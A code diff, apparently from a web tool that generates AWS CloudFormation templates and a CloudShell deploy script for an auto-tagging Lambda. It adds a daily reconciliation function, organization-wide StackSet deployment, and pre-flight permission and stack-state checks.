+                Resource: !Sub 'arn:aws:ssm:\${AWS::Region}:\${AWS::AccountId}:parameter/auto-map-tagger/${mpe}/config'
+              - Sid: EnumerateResources
+                Effect: Allow
+                Action:
+                  - tag:GetResources
+                Resource: '*'
+              - Sid: DescribeVpcMembership
+                Effect: Allow
+                Action:
+                  - ec2:DescribeInstances
+                  - ec2:DescribeVpcs
+                  - ec2:DescribeVolumes
+                  - ec2:DescribeNetworkInterfaces
+                Resource: '*'
+              - Sid: EnqueueToEventQueue
+                Effect: Allow
+                Action: sqs:SendMessage
+                Resource: !GetAtt EventQueue.Arn
+              - Sid: EmitReconciliationMetrics
+                Effect: Allow
+                Action: cloudwatch:PutMetricData
+                Resource: '*'
+                Condition:
+                  StringEquals:
+                    cloudwatch:namespace: MapAutoTagger
+              - Sid: LambdaLogging
+                Effect: Allow
+                Action:
+                  - logs:CreateLogStream
+                  - logs:PutLogEvents
+                Resource: !Sub '\${ReconciliationLogGroup.Arn}:*'
+
+  ReconciliationFunction:
+    Type: AWS::Lambda::Function
+    DependsOn: ReconciliationLogGroup
+    Properties:
+      FunctionName: map-auto-tagger-reconciliation-${mpe}
+      Runtime: python3.12
+      Handler: index.handler
+      Role: !GetAtt ReconciliationRole.Arn
+      Timeout: 900
+      MemorySize: 512
+      Environment:
+        Variables:
+          CONFIG_PARAM: /auto-map-tagger/${mpe}/config
+          EVENT_QUEUE_URL: !Ref EventQueue
+          MPE_ID: '${mpe}'
+      Code:
+        ZipFile: |
+          import json, os, time, boto3
+          from datetime import datetime, timezone
+          from botocore.exceptions import ClientError
+
+          CONFIG_PARAM = os.environ['CONFIG_PARAM']
+          EVENT_QUEUE_URL = os.environ['EVENT_QUEUE_URL']
+          MPE_ID = os.environ['MPE_ID']
+          TAG_KEY = 'map-migrated'
+          CANARY_THRESHOLD_SECS = 780
+
+          ssm = boto3.client('ssm')
+          sqs = boto3.client('sqs')
+          cw = boto3.client('cloudwatch')
+          tagging = boto3.client('resourcegroupstaggingapi')
+
+          def _emit(name, value=1, **dims):
+              try:
+                  cw.put_metric_data(
+                      Namespace='MapAutoTagger',
+                      MetricData=[{
+                          'MetricName': name,
+                          'Dimensions': [{'Name': k, 'Value': str(v)} for k, v in dims.items()],
+                          'Value': value,
+                          'Unit': 'Count',
+                      }],
+                  )
+              except Exception as e:
+                  print(f'metric emit failed ({name}): {e}')
+
+          def _current_map_tag(tag_list):
+              for t in tag_list or []:
+                  if t.get('Key') == TAG_KEY:
+                      return t.get('Value')
+              return None
+
+          def _parse_arn(arn):
+              parts = arn.split(':', 5)
+              if len(parts) < 6:
+                  return None, None
+              return parts[4] or None, parts[3] or None
+
+          def _synth_event(arn, account_id, region):
+              return {
+                  'version': '0',
+                  'source': 'map-auto-tagger.reconciliation',
+                  'account': account_id,
+                  'region': region,
+                  'detail-type': 'AWS API Call via CloudTrail',
+                  'detail': {
+                      'eventName': 'ReconciliationEnqueue',
+                      'recipientAccountId': account_id,
+                      'awsRegion': region,
+                      'responseElements': {'arn': arn},
+                      'requestParameters': {},
+                      'sourceIPAddress': 'map-auto-tagger.reconciliation',
+                  },
+              }
+
+          def handler(event, context):
+              start = time.time()
+              scanned = missing = wrong = already_ok = 0
+              canary_emitted = False
+              kwargs = {'ResourcesPerPage': 100, 'IncludeComplianceDetails': False}
+              while True:
+                  try:
+                      page = tagging.get_resources(**kwargs)
+                  except ClientError as e:
+                      err = e.response.get('Error', {}).get('Code', '')
+                      if err in ('ThrottledException', 'ThrottlingException'):
+                          time.sleep(2)
+                          continue
+                      _emit('ReconciliationRunAborted', reason='RgtaError')
+                      raise
+                  for r in page.get('ResourceTagMappingList', []):
+                      scanned += 1
+                      arn = r.get('ResourceARN', '')
+                      if not arn:
+                          continue
+                      account_id, region = _parse_arn(arn)
+                      if not account_id or not region:
+                          continue
+                      current = _current_map_tag(r.get('Tags'))
+                      if current == MPE_ID:
+                          already_ok += 1
+                          continue
+                      if current and current != MPE_ID:
+                          wrong += 1
+                          _emit('WrongMpeCorrected', ExpectedMpe=MPE_ID, FoundMpe=current)
+                      else:
+                          missing += 1
+                          _emit('ReconciliationMissingTag')
+                      try:
+                          sqs.send_message(
+                              QueueUrl=EVENT_QUEUE_URL,
+                              MessageBody=json.dumps(_synth_event(arn, account_id, region)),
+                          )
+                      except ClientError as e:
+                          _emit('ReconciliationEnqueueFailed')
+                  if not canary_emitted and (time.time() - start) > CANARY_THRESHOLD_SECS:
+                      _emit('ReconciliationTimeoutCanary', MpeId=MPE_ID)
+                      canary_emitted = True
+                  token = page.get('PaginationToken')
+                  if not token:
+                      break
+                  kwargs['PaginationToken'] = token
+              _emit('ReconciliationResourcesScanned', scanned)
+              print(json.dumps({
+                  'scanned': scanned, 'already_ok': already_ok,
+                  'missing': missing, 'wrong_mpe': wrong,
+                  'elapsed_secs': round(time.time() - start, 1),
+              }))
+              return {'status': 'completed', 'scanned': scanned, 'enqueued': missing + wrong}
+
+  ReconciliationSchedule:
+    Type: AWS::Events::Rule
+    Properties:
+      Name: map-auto-tagger-reconciliation-${mpe}
+      Description: Daily safety-net reconciliation trigger
+      ScheduleExpression: ${config.reconciliationInterval || 'rate(24 hours)'}
+      State: ENABLED
+      Targets:
+        - Arn: !GetAtt ReconciliationFunction.Arn
+          Id: ReconciliationLambda
+
+  ReconciliationSchedulePermission:
+    Type: AWS::Lambda::Permission
+    Properties:
+      FunctionName: !Ref ReconciliationFunction
+      Action: lambda:InvokeFunction
+      Principal: events.amazonaws.com
+      SourceArn: !GetAtt ReconciliationSchedule.Arn
+${backfillResources}
+Outputs:
+  LambdaArn:
+    Value: !GetAtt AutoTaggerFunction.Arn
+  ConfigParameter:
+    Value: !Ref MapConfig
+  TemplateVersion:
+    Description: MAP 2.0 Auto-Tagger template version (pinned at deploy time)
+    Value: ${TEMPLATE_VERSION}
+  AlertTopicArn:
+    Value: !Ref AlertTopic
+  EventQueueUrl:
+    Value: !Ref EventQueue
+  EventDLQUrl:
+    Value: !Ref EventDLQ`;
+        }
+
+        function generateInstructions(config) {
+            const mpe = config.mpeId;
+
+            if (config.deployMode === 'single') {
+                return `${t('ui_instr_single_title')}
+=========================================
+
+── ${t('ui_instr_opt1_title')} ──────────────────────────────
+1. ${t('ui_instr_login_single')}
+2. ${t('ui_instr_open_cloudshell')}
+3. ${t('ui_instr_upload_files')}
+     deploy.sh
+     map-auto-tagger-${mpe}.yaml
+4. ${t('ui_instr_run')}
+   bash deploy.sh
+
+── ${t('ui_instr_opt2_title')} ─────────────────────────────────
+1. ${t('ui_instr_cli_prereq_single')}
+2. ${t('ui_instr_cli_download')}
+3. ${t('ui_instr_cli_terminal')}
+4. ${t('ui_instr_run')}
+   bash deploy.sh
+
+─────────────────────────────────────────────────
+${t('ui_instr_done_single')}
+
+${t('ui_instr_verify_title')}
+   aws s3 mb s3://test-map-$(date +%s)
+   sleep 90
+   aws s3api get-bucket-tagging --bucket test-map-XXXX
+   # ${t('ui_instr_expected')}: {"TagSet": [{"Key": "map-migrated", "Value": "${mpe}"}]}
+
+${t('ui_instr_thats_it')}
+${t('ui_instr_existing_only')}`;
+            }
+
+            if (config.deployMode === 'multi') {
+                const accounts = (config.stacksetAccounts || []);
+                const accountList = accounts.map(a => `   - ${a.id}${a.label !== a.id ? ' (' + a.label + ')' : ''}`).join('\n') || `   ${t('ui_instr_all_accounts')}`;
+
+                return `${t('ui_instr_multi_title')}
+==========================================
+
+${t('ui_instr_files_received')}: deploy.sh, map-auto-tagger-org-${mpe}.yaml, map-auto-tagger-accounts-${mpe}.yaml
+${t('ui_instr_target_accounts')}: ${accounts.map(a => a.id + (a.label !== a.id ? ' (' + a.label + ')' : '')).join(', ') || t('ui_instr_all_org')}
+
+── ${t('ui_instr_opt1_title')} ──────────────────────────────
+1. ${t('ui_instr_login_multi')}
+2. ${t('ui_instr_open_cloudshell')}
+3. ${t('ui_instr_upload_all')}
+     deploy.sh
+     map-auto-tagger-org-${mpe}.yaml
+     map-auto-tagger-accounts-${mpe}.yaml
+4. ${t('ui_instr_run')}
+   bash deploy.sh
+
+── ${t('ui_instr_opt2_title')} ─────────────────────────────────
+1. ${t('ui_instr_cli_prereq_multi')}
+2. ${t('ui_instr_cli_download_all')}
+3. ${t('ui_instr_cli_terminal')}
+4. ${t('ui_instr_run')}
+   bash deploy.sh
+
+─────────────────────────────────────────────────
+${t('ui_instr_auto_handles')}
+  - ${t('ui_instr_uploads_s3')}
+  - ${t('ui_instr_enables_stacksets')}
+  - ${t('ui_instr_discovers_org')}
+  - ${t('ui_instr_deploys_all')}
+
+${t('ui_instr_check_status')}:
+
+   aws cloudformation list-stack-instances \\
+     --stack-set-name map-auto-tagger-${mpe} \\
+     --query "Summaries[*].[Account,Region,StackInstanceStatus.DetailedStatus]" \\
+     --output table
+   # ${t('ui_instr_expected')}: SUCCEEDED
+
+${t('ui_instr_done_multi')}
+${t('ui_instr_cloudtrail_note')}`;
+        }
+        }
+
+        function generatePerAccountTemplate(config) {
+            // Generate the single-account auto-tagger template (Lambda + EventBridge + IAM)
+            // Used as the StackSet target in multi-account mode
+            const singleConfig = Object.assign({}, config, { deployMode: 'single' });
+            return generateMainTemplate(singleConfig);
+        }
+
+        function generateOrgTemplate(config) {
+            // Generates the management account template.
+            // Uses a single Lambda Custom Resource that:
+            //   1. Auto-discovers root OU via organizations:ListRoots (no OU input from customer)
+            //   2. Fetches the per-account template from S3 using its own IAM role
+            //   3. Creates the StackSet with TemplateBody (avoids S3 access issues)
+            //   4. Deploys instances to all accounts via root OU targeting
+            // Customer runs ONE command. No OU IDs. No account IDs for deployment.
+            const mpe = config.mpeId;
+            const accounts = (config.stacksetAccounts || []);
+            const regions = (config.regions || ['ap-northeast-2']);
+            const regionsList = regions.map(r => `        - ${r}`).join('\n');
+            const scopedAccountIdsJson = (config.useAccountScope && config.stacksetAccounts && config.stacksetAccounts.length > 0)
+                ? JSON.stringify(config.stacksetAccounts.map(a => a.id))
+                : '["ALL"]';
+            const accountsNote = accounts.length > 0
+                ? `      # Lambda deployed to all org accounts. Tagging scoped to: ${accounts.map(a => a.id + (a.label !== a.id ? ' (' + a.label + ')' : '')).join(', ')}`
+                : `      # Lambda deployed to all org accounts. Tagging applies to all accounts.`;
+
+            return `# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
+# SPDX-License-Identifier: MIT-0
+AWSTemplateFormatVersion: '2010-09-09'
+Description: >
+  MAP 2.0 Auto-Tagger for ${config.customerName || 'Customer'} (MPE: ${mpe}).
+  Automatically discovers org structure and deploys Lambda to all accounts.
+  No OU IDs required. Deploy in the management account.
+
+Parameters:
+  MpeId:
+    Type: String
+    Default: '${mpe}'
+    Description: MAP 2.0 MPE ID
+  AgreementStartDate:
+    Type: String
+    Default: '${config.agreementDate}'
+    Description: MAP agreement start date (YYYY-MM-DD)
+  AgreementEndDate:
+    Type: String
+    Default: '${config.agreementEndDate}'
+    Description: MAP agreement end date (YYYY-MM-DD)
+  PerAccountTemplateURL:
+    Type: String
+    Description: S3 URL of map-auto-tagger-accounts-${mpe}.yaml
+
+Resources:
+
+  DeployRole:
+    Type: AWS::IAM::Role
+    Properties:
+      RoleName: auto-map-tagger-deploy-role-${mpe}
+      AssumeRolePolicyDocument:
+        Version: '2012-10-17'
+        Statement:
+          - Effect: Allow
+            Principal: {Service: lambda.amazonaws.com}
+            Action: sts:AssumeRole
+      Policies:
+        - PolicyName: DeployPolicy
+          PolicyDocument:
+            Version: '2012-10-17'
+            Statement:
+              - Effect: Allow
+                Action:
+                  - organizations:ListRoots
+                  - organizations:EnableAWSServiceAccess
+                  - cloudformation:CreateStackSet
+                  - cloudformation:DeleteStackSet
+                  - cloudformation:DescribeStackSet
+                  - cloudformation:CreateStackInstances
+                  - cloudformation:DeleteStackInstances
+                  - cloudformation:DescribeStackSetOperation
+                  - cloudformation:ListStackSetOperations
+                  - cloudformation:ListStackInstances
+                  - s3:GetObject
+                  - logs:CreateLogGroup
+                  - logs:CreateLogStream
+                  - logs:PutLogEvents
+                Resource: '*'
+
+  DeployFunction:
+    Type: AWS::Lambda::Function
+    DependsOn: DeployRole
+    Properties:
+      FunctionName: auto-map-tagger-deploy-fn-${mpe}
+      Runtime: python3.12
+      Handler: index.handler
+      Role: !GetAtt DeployRole.Arn
+      Timeout: 900
+      Code:
+        ZipFile: |
+          import boto3, json, time, urllib.request
+          def respond(event, context, status, data={}, reason=''):
+              body = json.dumps({'Status': status, 'Reason': reason,
+                  'PhysicalResourceId': event.get('PhysicalResourceId','Deploy'),
+                  'StackId': event['StackId'], 'RequestId': event['RequestId'],
+                  'LogicalResourceId': event['LogicalResourceId'], 'Data': data}).encode()
+              req = urllib.request.Request(event['ResponseURL'], data=body,
+                  headers={'Content-Type': ''}, method='PUT')
+              urllib.request.urlopen(req)
+          def handler(event, context):
+              time.sleep(15)
+              props = event.get('ResourceProperties', {})
+              cf = boto3.client('cloudformation')
+              stackset_name = props['StackSetName']
+              if event['RequestType'] == 'Delete':
+                  try:
+                      org = boto3.client('organizations', region_name='us-east-1')
+                      root_id = org.list_roots()['Roots'][0]['Id']
+                      cf.delete_stack_instances(StackSetName=stackset_name,
+                          DeploymentTargets={'OrganizationalUnitIds': [root_id]},
+                          Regions=props.get('Regions', ['ap-northeast-2']),
+                          RetainStacks=False,
+                          OperationPreferences={
+                              'MaxConcurrentPercentage': 100,
+                              'FailureTolerancePercentage': 100,
+                              'RegionConcurrencyType': 'PARALLEL',
+                          })
+                      time.sleep(90)
+                      cf.delete_stack_set(StackSetName=stackset_name)
+                  except Exception as e:
+                      print('Delete cleanup:', e)
+                  respond(event, context, 'SUCCESS')
+                  return
+              try:
+                  org = None
+                  for attempt in range(5):
+                      try:
+                          org = boto3.client('organizations', region_name='us-east-1')
+                          org.list_roots()  # test credentials
+                          break
+                      except Exception as e:
+                          if 'security token' in str(e).lower() or 'InvalidClientToken' in str(e) or 'UnrecognizedClient' in str(e):
+                              print(f'Credential propagation wait (attempt {attempt+1}): {e}')
+                              time.sleep(10)
+                          else:
+                              raise
+                  try:
+                      org.enable_aws_service_access(ServicePrincipal='stacksets.cloudformation.amazonaws.com')
+                      print('StackSets service access enabled')
+                  except Exception as e:
+                      print('Service access already enabled or skipped:', e)
+                  root_id = org.list_roots()['Roots'][0]['Id']
+                  print('Root OU:', root_id)
+                  # StackSet deploys Lambda to all org accounts.
+                  # Account-level filtering is handled by scoped_account_ids in Lambda config.
+                  targets = {'OrganizationalUnitIds': [root_id]}
+                  s3 = boto3.client('s3')
+                  url = props['TemplateURL']
+                  bkt = url.split('.s3.')[0].replace('https://','')
+                  key = url.split('.amazonaws.com/')[-1].split('?')[0]
+                  print('Fetching template:', bkt, key)
+                  body = s3.get_object(Bucket=bkt, Key=key)['Body'].read().decode()
+                  print('Template bytes:', len(body))
+                  # AutoDeployment rule: True only when scope is ALL accounts.
+                  # When the customer narrowed scope to specific accounts, flipping
+                  # AutoDeployment=True would silently add the Lambda to any new
+                  # account that joins the org, bypassing their chosen scope. Keep
+                  # it False so scoped deploys remain predictable.
+                  scoped = json.loads(props.get('ScopedAccounts', '["ALL"]'))
+                  auto_deploy = (scoped == ['ALL'])
+                  print(f'AutoDeployment={auto_deploy} (scoped_accounts={scoped})')
+                  try:
+                      cf.create_stack_set(StackSetName=stackset_name,
+                          Description='MAP 2.0 Auto-Tagger',
+                          TemplateBody=body,
+                          Parameters=[
+                              {'ParameterKey':'MpeId','ParameterValue':props['MpeId']},
+                              {'ParameterKey':'AgreementStartDate','ParameterValue':props['AgreementStartDate']},
+                              {'ParameterKey':'AgreementEndDate','ParameterValue':props['AgreementEndDate']},
+                              {'ParameterKey':'ScopeMode','ParameterValue':'account'},
+                          ],
+                          Capabilities=['CAPABILITY_NAMED_IAM'],
+                          PermissionModel='SERVICE_MANAGED',
+                          AutoDeployment={'Enabled': auto_deploy, 'RetainStacksOnAccountRemoval': False} if auto_deploy else {'Enabled': False})
+                      print('StackSet created')
+                  except cf.exceptions.NameAlreadyExistsException:
+                      print('StackSet already exists')
+                  try:
+                      # Parallel deployment across all accounts. Per-account Lambdas are
+                      # independent (no cross-account runtime deps), so 100/100 is safe:
+                      # deploy everywhere in parallel, recover partial failures by re-running
+                      # deploy.sh (CFN sees existing stacks and no-ops). Without this, AWS
+                      # defaults to MaxConcurrentCount=1 — a 500-account customer waits hours.
+                      op = cf.create_stack_instances(StackSetName=stackset_name,
+                          DeploymentTargets=targets,
+                          Regions=props.get('Regions', ['ap-northeast-2']),
+                          OperationPreferences={
+                              'MaxConcurrentPercentage': 100,
+                              'FailureTolerancePercentage': 100,
+                              'RegionConcurrencyType': 'PARALLEL',
+                          })
+                      print('Op:', op['OperationId'])
+                  except cf.exceptions.OperationInProgressException:
+                      print('OperationInProgress — responding SUCCESS to let deploy.sh poll')
+                  respond(event, context, 'SUCCESS', {'StackSetName': stackset_name, 'RootId': root_id})
+              except Exception as e:
+                  import traceback
+                  print(traceback.format_exc())
+                  respond(event, context, 'FAILED', reason=str(e))
+
+  Deployment:
+    Type: Custom::Deploy
+    DependsOn: DeployFunction
+    Properties:
+      ServiceToken: !GetAtt DeployFunction.Arn
+      StackSetName: map-auto-tagger-${mpe}
+      TemplateURL: !Ref PerAccountTemplateURL
+      MpeId: !Ref MpeId
+      AgreementStartDate: !Ref AgreementStartDate
+      AgreementEndDate: !Ref AgreementEndDate
+      ScopedAccounts: '${scopedAccountIdsJson}'
+      Regions:
+${regionsList}
+${accountsNote}
+
+Outputs:
+  StackSetName:
+    Value: !GetAtt Deployment.StackSetName
+  RootOU:
+    Value: !GetAtt Deployment.RootId`;
+        }
+
+        function generateDeployScript(config, mainTemplate, perAccountTemplate) {
+            const mpe = config.mpeId;
+            const regions = (config.regions || ['ap-northeast-2']);
+            const region = regions[0];
+            const regionArgs = regions.map(r => `"${r}"`).join(' ');
+
+            // Escape backticks and dollar signs in template content for safe embedding in heredoc
+            const escapeHeredoc = (s) => s.replace(/`/g, '\`');
+
+            // Shell-safe containment for customerName. We emit the value inside SINGLE quotes
+            // so bash performs no interpolation. The classic `'\''` trick closes the single-quoted
+            // span, inserts an escaped literal quote, and reopens. Also strip CR/LF to prevent a
+            // newline from escaping single-line shell contexts (e.g. comment lines).
+            //
+            // DO NOT change this to double-quoted emit without also removing the single-quote escape:
+            // in double quotes, $(...), backticks, \, and $VAR all still expand, re-opening the
+            // supply-chain RCE the escape was meant to prevent.
+            const shellSingleQuote = (s) => `'${String(s).replace(/[\r\n]/g, ' ').replace(/'/g, "'\\''")}'`;
+            const customerDisplay = shellSingleQuote(config.customerName || 'Customer');
+            // Header comment form — strip CR/LF so a newline in the field can't escape the `#`
+            // comment line and land on a fresh executable line.
+            const customerComment = String(config.customerName || 'Customer').replace(/[\r\n]/g, ' ');
+            const reportFile = `map-tagger-report-${mpe}-\$(date +%Y%m%d-%H%M%S).txt`;
+
+            if (config.deployMode === 'single') {
+                const tpl = escapeHeredoc(mainTemplate);
+                return `#!/bin/bash
+# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
+# SPDX-License-Identifier: MIT-0
+#
+# MAP 2.0 Auto-Tagger — Deployment Script
+# Customer: ${customerComment} | MPE: ${mpe}
+# Run this file in AWS CloudShell: bash deploy.sh
+set -e
+
+STACK_NAME="map-auto-tagger-${mpe}"
+REGIONS="${regions.join(' ')}"
+REGION="${region}"
+MPE="${mpe}"
+CUSTOMER=${customerDisplay}
+REPORT_FILE="${reportFile}"
+DEPLOY_TIME=\$(date '+%Y-%m-%d %H:%M:%S')
+PREFLIGHT_LOG=""
+DEPLOY_STATUS="NOT STARTED"
+TEMPLATE_REF=""
+BUCKET=""
+trap 'if [ -n "\$BUCKET" ] && [ -n "\$TEMPLATE_REF" ]; then aws s3 rm "s3://\${BUCKET}/map-auto-tagger-\${MPE}.yaml" > /dev/null 2>&1 || true; aws s3 rb "s3://\${BUCKET}" --force > /dev/null 2>&1 || true; fi' EXIT
+
+# ────────────────────────────────────────────
+echo ""
+echo "  ┌─────────────────────────────────────────┐"
+echo "  │   ${t('d_title')}              │"
+echo "  │   ${t('d_tag_label')}: \$MPE"
+echo "  │   ${t('d_region_label')}: \$REGIONS"
+echo "  └─────────────────────────────────────────┘"
+echo ""
+
+# ── Step 1: Pre-flight checks ────────────────
+echo "${t('d_step1')}"
+echo ""
+ERRORS=0
+
+if ! aws sts get-caller-identity > /dev/null 2>&1; then
+    echo "  ❌ ${t('d_fail_creds')}"
+    echo "     ${t('d_fix_label')} ${t('d_fix_creds')}"
+    PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_fail')} ${t('d_fail_creds')}\\n"
+    ERRORS=\$((ERRORS + 1))
+else
+    echo "  ✅ ${t('d_ok_creds')}"
+    PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_pass')} ${t('d_ok_creds')}\\n"
+fi
+
+for CHECK_REGION in \$REGIONS; do
+    TRAIL_COUNT=\$(aws cloudtrail describe-trails --region "\$CHECK_REGION" --query 'trailList[*].TrailARN' --output text 2>/dev/null | wc -w)
+    if [ "\$TRAIL_COUNT" -eq 0 ]; then
+        echo "  ❌ ${t('d_fail_trail')} \$CHECK_REGION"
+        echo "     ${t('d_fix_label')} ${t('d_fix_trail1')}"
+        echo "            ${t('d_fix_trail2')} \$CHECK_REGION"
+        PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_fail')} ${t('d_fail_trail')} \$CHECK_REGION\\n"
+        ERRORS=\$((ERRORS + 1))
+    else
+        echo "  ✅ ${t('d_ok_trail')} \$CHECK_REGION"
+        PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_pass')} ${t('d_ok_trail')} \$CHECK_REGION\\n"
+    fi
+done
+
+if ! aws cloudformation list-stacks --region "\$REGION" > /dev/null 2>&1; then
+    echo "  ❌ ${t('d_fail_perms')}"
+    echo "     ${t('d_fix_label')} ${t('d_fix_perms')}"
+    PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_fail')} ${t('d_fail_perms')}\\n"
+    ERRORS=\$((ERRORS + 1))
+else
+    echo "  ✅ ${t('d_ok_perms')}"
+    PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_pass')} ${t('d_ok_perms')}\\n"
+fi
+
+SCP_RESULT=\$(aws iam simulate-principal-policy \\
+    --policy-source-arn "\$(aws sts get-caller-identity --query Arn --output text 2>/dev/null)" \\
+    --action-names "tag:TagResources" \\
+    --query 'EvaluationResults[0].EvalDecision' \\
+    --output text 2>/dev/null) || SCP_RESULT=""
+if [ "\$SCP_RESULT" = "explicitDeny" ]; then
+    echo "  ❌ ${t('d_fail_scp')}"
+    echo "     ${t('d_fix_label')} ${t('d_fix_scp')}"
+    PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_fail')} ${t('d_fail_scp')}\\n"
+    ERRORS=\$((ERRORS + 1))
+else
+    echo "  ✅ ${t('d_ok_scp')}"
+    echo "     ${t('d_scp_note')}"
+    PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_pass')} ${t('d_ok_scp')}\\n"
+fi
+
+# ── Deploy-time IAM actions ─────────────────────
+# Simulate the permissions deploy.sh actually needs (not Lambda runtime — that's
+# granted by the Lambda's own role). explicitDeny means an SCP blocks the action.
+# implicitDeny means the principal has no policy granting it. Both fail deploy.
+# Single batched simulate-principal-policy call ≈ 200ms for all checks combined.
+CALLER_ARN=\$(aws sts get-caller-identity --query Arn --output text 2>/dev/null || echo "")
+# simulate-principal-policy needs an IAM user/role ARN, NOT the assumed-role session
+# ARN returned by get-caller-identity (e.g. arn:aws:sts::...:assumed-role/Foo/session).
+# Convert assumed-role → role ARN for SSO / role callers; pass through for IAM users.
+if [[ "\$CALLER_ARN" == *":assumed-role/"* ]]; then
+    SIM_ACCT=\$(echo "\$CALLER_ARN" | cut -d: -f5)
+    SIM_ROLE=\$(echo "\$CALLER_ARN" | sed 's|.*:assumed-role/||' | cut -d/ -f1)
+    SIM_ARN="arn:aws:iam::\${SIM_ACCT}:role/\${SIM_ROLE}"
+else
+    SIM_ARN="\$CALLER_ARN"
+fi
+IAM_CHECK_ACTIONS=( \\
+  "cloudformation:CreateStack" \\
+  "cloudformation:UpdateStack" \\
+  "cloudformation:DescribeStacks" \\
+  "cloudformation:GetTemplateSummary" \\
+  "cloudformation:ListStacks" \\
+  "iam:CreateRole" \\
+  "iam:PutRolePolicy" \\
+  "iam:AttachRolePolicy" \\
+  "iam:PassRole" \\
+  "lambda:CreateFunction" \\
+  "lambda:AddPermission" \\
+  "events:PutRule" \\
+  "events:PutTargets" \\
+  "sqs:CreateQueue" \\
+  "sqs:SetQueueAttributes" \\
+  "ssm:PutParameter" \\
+  "ssm:GetParameter" \\
+  "logs:CreateLogGroup" \\
+  "logs:PutRetentionPolicy" \\
+  "sns:CreateTopic" \\
+  "sns:Subscribe" \\
+  "s3:CreateBucket" \\
+  "s3:PutBucketPolicy" \\
+)
+if [ -n "\$SIM_ARN" ]; then
+    IAM_DENIED=\$(aws iam simulate-principal-policy \\
+        --policy-source-arn "\$SIM_ARN" \\
+        --action-names "\${IAM_CHECK_ACTIONS[@]}" \\
+        --query 'EvaluationResults[?EvalDecision != \`allowed\`].[EvalActionName,EvalDecision]' \\
+        --output text 2>/dev/null || echo "")
+    if [ -n "\$IAM_DENIED" ]; then
+        echo "  ❌ ${t('d_fail_iam')}"
+        echo "\$IAM_DENIED" | while IFS=\$'\\t' read -r action decision; do
+            echo "     - \$action → \$decision"
+            PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_fail')} IAM: \$action \$decision\\n"
+        done
+        echo "     ${t('d_fix_label')} ${t('d_fix_iam')}"
+        ERRORS=\$((ERRORS + 1))
+    else
+        echo "  ✅ ${t('d_ok_iam')} (\${#IAM_CHECK_ACTIONS[@]})"
+        PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_pass')} ${t('d_ok_iam')}\\n"
+    fi
+else
+    echo "  ⚠️  ${t('d_skip_iam')}"
+    PREFLIGHT_LOG="\${PREFLIGHT_LOG}[SKIP] ${t('d_skip_iam')}\\n"
+fi
+
+# ── Stack state ready for deploy ───────────────────────────────────
+# Deploy.sh below handles NOT_FOUND / DELETE_COMPLETE (fresh create),
+# ROLLBACK_COMPLETE (delete + recreate), and *_COMPLETE (update). Any
+# other state leaves the deployer in a cryptic-error tarpit. Fail
+# fast with a specific remediation instead.
+for CHECK_REGION in \$REGIONS; do
+    PREDEPLOY_STATUS=\$(aws cloudformation describe-stacks --stack-name "\$STACK_NAME" \\
+        --region "\$CHECK_REGION" --query 'Stacks[0].StackStatus' --output text 2>/dev/null \\
+        || echo "NOT_FOUND")
+    case "\$PREDEPLOY_STATUS" in
+        NOT_FOUND|DELETE_COMPLETE|ROLLBACK_COMPLETE|CREATE_COMPLETE|UPDATE_COMPLETE|UPDATE_ROLLBACK_COMPLETE)
+            echo "  ✅ ${t('d_ok_stack_state')} \$CHECK_REGION (\$PREDEPLOY_STATUS)"
+            PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_pass')} ${t('d_ok_stack_state')} \$CHECK_REGION\\n"
+            ;;
+        *_IN_PROGRESS)
+            echo "  ❌ ${t('d_fail_stack_inprogress')} \$CHECK_REGION (\$PREDEPLOY_STATUS)"
+            echo "     ${t('d_fix_label')} ${t('d_fix_stack_inprogress')}"
+            PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_fail')} ${t('d_fail_stack_inprogress')} \$CHECK_REGION \$PREDEPLOY_STATUS\\n"
+            ERRORS=\$((ERRORS + 1))
+            ;;
+        UPDATE_ROLLBACK_FAILED|ROLLBACK_FAILED|DELETE_FAILED)
+            echo "  ❌ ${t('d_fail_stack_stuck')} \$CHECK_REGION (\$PREDEPLOY_STATUS)"
+            echo "     ${t('d_fix_label')} ${t('d_fix_stack_stuck')}"
+            echo "     - UPDATE_ROLLBACK_FAILED: aws cloudformation continue-update-rollback --stack-name \$STACK_NAME --region \$CHECK_REGION"
+            echo "     - ROLLBACK_FAILED / DELETE_FAILED: delete via console (may require AWS Support)"
+            PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_fail')} ${t('d_fail_stack_stuck')} \$CHECK_REGION \$PREDEPLOY_STATUS\\n"
+            ERRORS=\$((ERRORS + 1))
+            ;;
+        *)
+            echo "  ⚠️  ${t('d_warn_stack_unknown')} \$CHECK_REGION (\$PREDEPLOY_STATUS)"
+            PREFLIGHT_LOG="\${PREFLIGHT_LOG}[WARN] ${t('d_warn_stack_unknown')} \$CHECK_REGION \$PREDEPLOY_STATUS\\n"
+            ;;
+    esac
+done
+
+# ── Same-account multi-Lambda conflict (Class 2: single-account, Q3 Option D) ────
+# If another map-auto-tagger-* stack exists in this account with a different
+# MPE, both Lambdas receive the same CloudTrail events. Whoever tags last wins.
+# Q3 Option D intersects scopes per pair and hard-fails only on actual overlap:
+#
+#   account/ALL     vs anything in same account → conflict (ALL dominates)
+#   account/[X,Y,…] vs account/[Z,Y,…]          → conflict iff shared account ID
+#   account/[X,Y,…] vs vpc/[V,…]                → conflict iff this deploy-account is in [X,Y,…]
+#                                                  (the account-scoped peer claims all of account,
+#                                                   including the VPC-scoped peer's VPCs)
+#   vpc/[V1,V2]     vs vpc/[V2,V3]              → conflict iff shared VPC ID
+#   vpc/[V1,…]      vs vpc/[Vn,…] (disjoint)    → safe coexistence
+NEW_SCOPE_MODE="${config.scopeMode || 'account'}"
+NEW_VPC_LIST="${(config.scopedVpcIds && config.scopedVpcIds[0] !== 'NONE') ? config.scopedVpcIds.join(' ') : ''}"
+# For single-account deploys, the new scope's "account list" is always just \$ACCOUNT.
